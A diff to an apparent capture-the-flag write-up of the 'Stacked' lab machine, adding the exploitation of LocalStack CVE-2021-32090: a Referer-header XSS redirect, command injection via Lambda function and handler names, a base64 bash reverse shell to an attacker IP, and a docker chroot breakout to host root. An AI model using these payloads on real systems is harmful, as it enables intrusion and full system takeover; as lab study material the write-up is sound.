@@ -99,7 +99,7 @@ req2.send(response);
 
 ## LocalStack vulnerability
 
-#### CVE-2021-32090 
+#### Find CVE-2021-32090 
 - locatstack version v0.12.6
 - CVE search
 - CVE-2021-32090 
@@ -146,9 +146,72 @@ aws lambda --endpoint=http://s3-testing.stacked.htb \
 check if it run properly
 ``` cat output ```
 
-PS: if use python script, set "Runtime": "python3.7", but this machine does not have python runtime, so there would be an error.
+PS: 
+- if use python script, set "Runtime": "python3.7", but this machine does not have python runtime, so there would be an error.
+- A Lambda function can be thought of as spinning up a relatively empty container, running the function, and then tearing that container down. So it`s not properate to make a reverse shell by lambda.
 
-####  
+#### Exploit CVE-2021-32090 
 
+The idea here is that there is a command injection in the "function name", will be triggered when it’s displayed on the web dashboard.
+- In previous config file, we know that dashboard is at port 8080 on victim`s machine.
+- ref: <https://blog.sonarsource.com/hack-the-stack-with-localstack>
 
+how:
+- 1. send user to dashboard by XSS. 
+- In referer header add: <script>document.location="http://127.0.0.1:8080"</script>
+- 2. command inection in "function name".
+- Test simple wget command first.
+
+## reverse shell
+
+#### execute shell
+```bash
+echo -n 'bash -i >& /dev/tcp/{attackerIP}/{port} 0>&1' | base64 -w 0
+```
+- add some space to avoid '+' or '=' sign, maybe bad character.(maybe not needed)
+
+invoke the command
+```bash
+--function-name 'echo -n {base64 reverseshell} | base64 -d | bash'
+```
+
+#### upgrade shell
+```python
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+^Z
+stty raw -echo; fg
+```
+
+#### make the shell can clear screen
+```
+export TERM=xterm
+```
+
+Now in the localstack container.
+
+## privesc
+
+#### PSPY
+- pspy - unprivileged Linux process snooping
+- <https://github.com/DominicBreuker/pspy>
+- download to victim, can not run at /dev/shm (noexec), but can run at /tmp
+- find that handler was run by root.
+- so add handler the reverse shell.
+```bash
+aws lambda create-function \
+    --function-name '{not this time}' \
+    --zip-file fileb://index.zip \
+    --handler '$({the reverse shell command as before})' \
+    --role localstackdonotmatter\
+    --runtime nodejs10.x
+```
+- get root of the container.
+- On gtfobins.io
+```bash
+# Shell
+# It can be used to break out from restricted environments by spawning an interactive system shell.
+# The resulting is a root shell.
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+then get the system root.
 
